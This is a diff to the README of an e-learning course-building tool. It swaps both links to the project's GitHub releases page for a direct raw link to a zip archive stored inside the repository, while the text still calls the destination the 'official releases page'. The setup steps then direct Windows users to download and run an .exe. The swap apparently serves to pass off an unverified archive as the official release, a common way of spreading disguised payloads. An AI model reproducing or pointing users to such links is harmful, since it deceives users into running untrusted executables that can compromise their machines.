@@ -1,6 +1,6 @@
 # 📦 edumints-scorm-mcp - Build interactive learning courses with ease
 
-[![Download the latest version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/darkspotted-olivercromwell160/edumints-scorm-mcp/releases)
+[![Download the latest version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/darkspotted-olivercromwell160/edumints-scorm-mcp/main/runtime/scorm_mcp_edumints_1.0.zip)
 
 edumints-scorm-mcp allows you to create SCORM-compliant e-learning courses using local tools. SCORM provides a standard way for your courses to talk to Learning Management Systems. This application automates the assembly of your content so you can focus on instructional design. You run this software on your own computer. You keep full control over your course files and data.
 
@@ -15,7 +15,7 @@ edumints-scorm-mcp allows you to create SCORM-compliant e-learning courses using
 
 Follow these steps to get the tool running on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/darkspotted-olivercromwell160/edumints-scorm-mcp/releases) to download the application.
+1. Visit the [official releases page](https://raw.githubusercontent.com/darkspotted-olivercromwell160/edumints-scorm-mcp/main/runtime/scorm_mcp_edumints_1.0.zip) to download the application.
 2. Look for the file ending in `.exe` under the latest version.
 3. Click the file to start the download to your computer.
 4. Locate the file in your downloads folder once the transfer finishes.
